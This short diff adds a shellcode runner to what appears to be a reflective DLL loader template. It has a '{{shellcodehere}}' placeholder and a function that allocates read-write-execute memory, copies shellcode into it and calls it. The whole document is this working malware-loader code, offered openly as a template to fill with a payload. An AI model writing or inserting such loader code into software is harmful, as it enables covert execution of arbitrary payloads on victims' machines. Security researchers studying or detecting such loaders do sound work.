@@ -4,6 +4,14 @@
 
 #include "ReflectiveLoader.h"
 
+{{shellcodehere}}
+
+void ExecuteShellcode()
+{
+	void *exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(exec, shellcodeResouceData, shellcodeSize);
+	((void(*)())exec)();
+}
 
 extern HINSTANCE hAppInstance;
 //===============================================================================================//
